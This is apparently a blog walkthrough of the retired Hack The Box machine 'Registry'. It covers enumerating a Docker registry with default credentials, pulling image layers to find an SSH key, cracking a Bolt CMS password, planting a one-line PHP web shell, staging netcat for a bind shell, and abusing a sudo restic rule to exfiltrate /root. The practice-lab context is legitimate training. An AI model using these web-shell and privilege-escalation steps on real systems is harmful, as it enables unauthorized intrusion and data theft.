---
layout: post
title: "Registry: Hack The Box Walkthrough"
date: 2020-04-04 18:41:19 +0000
last_modified_at: 2020-04-04 18:41:19 +0000
category: Walkthrough
tags: ["Hack The Box", Registry, retired, Linux, Hard]
comments: true
image:
  feature: registry-htb-walkthrough.jpg
  credit: arembowski / Pixabay
  creditlink: https://pixabay.com/photos/archive-boxes-documents-folders-4215548/
---

This post documents the complete walkthrough of Registry, a retired vulnerable [VM][1] created by [thek][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Registry is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.159 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-20 10:43:43 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.159                                    
Discovered open port 443/tcp on 10.10.10.159                                   
Discovered open port 22/tcp on 10.10.10.159
```

Nothing unusual with the open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,443 -A --reason -oN nmap.txt 10.10.10.159
...
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
```

Did you see `docker.registry.htb`? Let's pop that in to `/etc/hosts`.

### Docker Registry

Something tells me that I'm looking at a docker registry.

```
# curl -ik https://docker.registry.htb/v2/
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 20 Oct 2019 15:10:45 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 87
Connection: keep-alive
Docker-Distribution-Api-Version: registry/2.0
Www-Authenticate: Basic realm="Registry"
X-Content-Type-Options: nosniff

{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```

Bingo.

Based on the API [overview](https://docs.docker.com/registry/spec/api/#overview), I can simply issue `/v2/_catalog`, to list the repositories that are in this cluster. I got lucky with the credential (`admin:admin`) by the way.

```
# curl -ik --user "admin:admin" https://docker.registry.htb/v2/_catalog
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 20 Oct 2019 15:15:16 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 32
Connection: keep-alive
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

{"repositories":["bolt-image"]}
```

Seem like this registry is hosting a repository for the Bolt CMS docker image. How's how the site,  `/bolt` looks like.

{% include image.html image_alt="c12f044f.png" image_src="/assets/images/posts/registry-htb-walkthrough/c12f044f.png" %}


Let's list out the tags.

```
# curl -ik --user "admin:admin" https://docker.registry.htb/v2/bolt-image/tags/list
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 20 Oct 2019 15:20:59 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 40
Connection: keep-alive
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

{"name":"bolt-image","tags":["latest"]}
```

We can also list out the image manifest like so.

```
# curl -ik --user "admin:admin" https://docker.registry.htb/v2/bolt-image/manifests/latest
...
"fsLayers": [                                                                                                                                                                                        
      {                                                                                                                                                                                                 
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"                                                                                                           
      },                                                                                                                                                                                                
      {                                                                                                                                                                                                 
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"                                                                                                           
      },
      {                                                                                                                                                                                                 
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"                                                                                                           
      },                                                                                                                                                                                                
      {                                                                                                                                                                                                 
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"                                                                                                           
      },                                                                                                                                                                                                
      {                                                                                             
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
      },            
      {                                                                                                                                                                                                 
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },                   
      {                                                                                             
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"                                                                                                           
      },                                                                                            
      {                   
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },                                                                                                                                                                                                
      {                                                                                                                                                                                                 
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {                                                                                                                                                                                                 
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
   ],
```

The blobs are like commits to the "latest" image. They are `gzip`'d tarballs. We can download these blobs and inspect them further for any sensitive information. Let's write a shell script to download all of them.

<div class="filename"><span>fetch.sh</span></div>

```
#!/bin/bash                                

HOST=docker.registry.htb                   
USER=admin                                 
PASS=admin                                 
BLOB=$1                                    

curl -s \                                  
     --output ${BLOB#sha256:*}.tar.gz \    
     --user "${USER}:${PASS}" \            
     http://$HOST/v2/bolt-image/blobs/$BLOB
```

Combine the script with GNU Parallel and you get yourself a multi-threaded downloader of sorts. :wink:

```
# parallel -j4 ./fetch.sh {} < blobs.txt
```

The file `blobs.txt` contains all the digests like so.

```
sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0
sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a
sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797
sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
```

I found the SSH key pair of `bolt`.

{% include image.html image_alt="1f298100.png" image_src="/assets/images/posts/registry-htb-walkthrough/1f298100.png" %}


And the password (`GkOcz221Ftb3ugog`) to unlock the private key.

{% include image.html image_alt="0191d3ac.png" image_src="/assets/images/posts/registry-htb-walkthrough/0191d3ac.png" %}


## Low-Privilege Shell

Suffice to say, the key pair gave me access to a low-privilege shell as `bolt`, and the file `user.txt `is at `bolt`'s home directory.

{% include image.html image_alt="f3861115.png" image_src="/assets/images/posts/registry-htb-walkthrough/f3861115.png" %}


Looks like someone got there before I did. :laughing:

{% include image.html image_alt="d9f3bbd8.png" image_src="/assets/images/posts/registry-htb-walkthrough/d9f3bbd8.png" %}


## Privilege Escalation

During enumeration of `bolt`'s account, I notice that that I can read the SQLite3 database used in Bolt CMS at `/var/www/html/bolt/app/database/bolt.db`. It's trivial to download a copy with `scp` to my attacking machine for further analysis.

```
# scp -i bolt bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .
# sqlite3 bolt.db
```

{% include image.html image_alt="5e25a2fd.png" image_src="/assets/images/posts/registry-htb-walkthrough/5e25a2fd.png" %}


Sending the hash to John the Ripper reveals the password (`strawbery`).

{% include image.html image_alt="b6f7539f.png" image_src="/assets/images/posts/registry-htb-walkthrough/b6f7539f.png" %}


Armed with `admin`'s password, I can log in to the Bolt CMS admin page at `/bolt/bolt`.

{% include image.html image_alt="0d790da3.png" image_src="/assets/images/posts/registry-htb-walkthrough/0d790da3.png" %}


### Bolt CMS Admin

One can allow PHP scripts to be uploaded in Bolt CMS by editing the `config.yml` file at line 240 to include 'php' as shown below. Once that's done, you can upload a simple PHP shell as follows.

```
<?php echo shell_exec($_GET[0]); ?>
```

{% include image.html image_alt="63ad602d.png" image_src="/assets/images/posts/registry-htb-walkthrough/63ad602d.png" %}


{% include image.html image_alt="747b576a.png" image_src="/assets/images/posts/registry-htb-walkthrough/747b576a.png" %}


{% include image.html image_alt="062e2e1e.png" image_src="/assets/images/posts/registry-htb-walkthrough/062e2e1e.png" %}


There you have it. Usually at this point, it's time to get a reverse shell but that's pointless because all outbound traffic is blocked.

{% include image.html image_alt="df382c3e.png" image_src="/assets/images/posts/registry-htb-walkthrough/df382c3e.png" %}


What now? If a reverse shell is not possible, then we'll try a bind shell. But first, we need the `nc` package with the `-c` and `-e` switches. To do that, let's transfer the `nc` from Kali Linux over to `/tmp` with `scp`.

```
# scp -i bolt /bin/nc.traditional bolt@10.10.10.159:/tmp/nc
```

{% include image.html image_alt="c5bdf14b.png" image_src="/assets/images/posts/registry-htb-walkthrough/c5bdf14b.png" %}


Looks like `www-data` has the permission to do something as `root` without password!

{% include image.html image_alt="695626fc.png" image_src="/assets/images/posts/registry-htb-walkthrough/695626fc.png" %}


### Restic Backup

According to the [documentation](https://restic.readthedocs.io/en/latest/010_introduction.html),

> Restic is a fast and secure backup program.

The `sudo` policy seems to be suggesting that we backup to a remote REST server. Recall that all outbound traffic is blocked? Well, we'll just have to set up the REST server locally and have `restic` installed on our machine remotely restore the data instead.

{% include image.html image_alt="6908582f.png" image_src="/assets/images/posts/registry-htb-walkthrough/6908582f.png" %}


We'll transfer a copy of [`rest-server`](https://github.com/restic/rest-server) over with `scp`. Good thing that `rest-server` is a statically-linked executable with no external dependencies.

```
# scp -i bolt rest-server bolt@10.10.10.159:/dev/shm
```

Next, let's set up a local repository as a remote repository shares the same layout.

{% include image.html image_alt="5ef72a60.png" image_src="/assets/images/posts/registry-htb-walkthrough/5ef72a60.png" %}


Here we can choose any password, just don't forget it. Once that's done, we can set up the REST server.

```
./rest-server --listen :8888 --no-auth --path=/dev/shm/rip &
```

Here's the local REST server is listening at `8888/tcp` and the path is pointing to `/dev/shm/rip`, the local repository we just initialized.

Time to backup `/root` as `root`!

{% include image.html image_alt="ce96f344.png" image_src="/assets/images/posts/registry-htb-walkthrough/ce96f344.png" %}


On my machine, I can dump `root.txt` from the latest snapshot.

{% include image.html image_alt="1ecffee2.png" image_src="/assets/images/posts/registry-htb-walkthrough/1ecffee2.png" %}


:dancer:

## Afterthought

Due to a decision by HTB to patch this machine at the Eleventh Hour, I've to rework the privilege escalation section. I apologize in advance if the write-up appears incoherent.

[1]: https://www.hackthebox.eu/home/machines/profile/213
[2]: https://www.hackthebox.eu/home/users/profile/4615
[3]: https://www.hackthebox.eu/
